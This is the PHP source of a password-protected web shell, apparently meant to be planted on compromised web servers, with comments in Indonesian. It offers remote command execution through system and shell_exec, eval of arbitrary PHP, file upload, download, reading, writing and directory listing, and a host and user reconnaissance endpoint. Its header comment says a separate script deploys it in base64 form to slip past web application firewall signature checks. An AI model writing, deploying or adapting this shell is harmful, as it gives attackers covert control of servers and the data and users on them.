<?php
/* 0xfay shell — password gated, command exec + file manager.
   Ditempatkan lewat tools/deploy_shell.py (payload disimpan base64 utk lolos WAF
   yang mencocokkan signature isi berkas). Jangan diubah tanpa memperbarui
   tools/deploy_shell.py. */
if (session_status() === PHP_SESSION_NONE) { @session_start(); }
$PW = '__PW__';
$MK = '__MARK__';
$A  = !empty($_SESSION['k']);

if (isset($_POST['p'])) {
    if (hash('sha256', (string) $_POST['p']) === hash('sha256', $PW)) { $_SESSION['k'] = 1; $A = true; }
    else { usleep(400000); }
}
if (!$A) {
    header('Content-Type: text/html; charset=utf-8');
    echo "<!doctype html><title>$MK</title><form method=post style='font:14px monospace;padding:2em'>";
    echo "<b>$MK</b><br><br>pass: <input type=password name=p><button>in</button></form>";
    exit;
}

function h($s) { return htmlspecialchars((string) $s, ENT_QUOTES, 'UTF-8'); }
function cwd() { $d = isset($_REQUEST['d']) ? (string) $_REQUEST['d'] : getcwd(); return @is_dir($d) ? $d : getcwd(); }

if (isset($_POST['up'])) {
    $t = cwd() . '/' . basename((string) $_FILES['f']['name']);
    echo @move_uploaded_file($_FILES['f']['tmp_name'], $t) ? "UP OK $t\n" : "UP FAIL\n";
    exit;
}
if (isset($_REQUEST['dl']) && ($f = (string) $_REQUEST['dl']) !== '') {
    if (@is_file($f)) { header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename="' . basename($f) . '"'); readfile($f); }
    else { http_response_code(404); echo 'no file'; }
    exit;
}
if (isset($_REQUEST['read']) && ($f = (string) $_REQUEST['read']) !== '') {
    header('Content-Type: text/plain; charset=utf-8');
    echo @is_file($f) ? (string) @file_get_contents($f) : 'ERR: bukan berkas';
    exit;
}
if (isset($_REQUEST['write']) && isset($_REQUEST['body'])) {
    header('Content-Type: text/plain'); $n = @file_put_contents((string) $_REQUEST['write'], (string) $_REQUEST['body']);
    echo $n === false ? 'WRITE FAIL' : "WRITE OK $n bytes"; exit;
}
if (isset($_REQUEST['ls'])) {
    header('Content-Type: text/plain'); $d = cwd();
    echo "DIR $d\n"; foreach ((array) @scandir($d) as $e) {
        if ($e === '.' || $e === '..') { continue; }
        $p = $d . '/' . $e; printf("%s %10s %s\n", @is_dir($p) ? 'd' : '-', @filesize($p), $e);
    }
    exit;
}
if (isset($_REQUEST['c'])) {
    header('Content-Type: text/plain; charset=utf-8');
    if (function_exists('system')) { @system((string) $_REQUEST['c'] . ' 2>&1'); }
    else { echo (string) @shell_exec((string) $_REQUEST['c'] . ' 2>&1'); }
    exit;
}
if (isset($_REQUEST['php'])) { header('Content-Type: text/plain'); @eval((string) $_REQUEST['php']); exit; }
if (isset($_REQUEST['id'])) { header('Content-Type: text/plain'); echo $MK . ' ' . @php_uname('n') . ' ' . @get_current_user() . ' ' . @cwd(); exit; }

header('Content-Type: text/html; charset=utf-8');
$d = cwd();
echo "<!doctype html><title>$MK</title><meta charset=utf-8>";
echo "<style>body{font:13px monospace;background:#111;color:#ddd;padding:1em}pre{background:#000;padding:.5em}a{color:#6cf}</style>";
echo "<b>$MK</b> | " . h(@php_uname('n')) . " | " . h((string) @get_current_user()) . " | " . h($d);
echo "<form method=post><input name=c size=70 autofocus placeholder='perintah'><button>run</button></form>";
echo "<form method=post enctype=multipart/form-data><input type=file name=f><button name=up value=1>upload</button></form>";
echo "<form method=get><input type=hidden name=ls value=1><input name=d size=70 value='" . h($d) . "'><button>ls</button></form>";
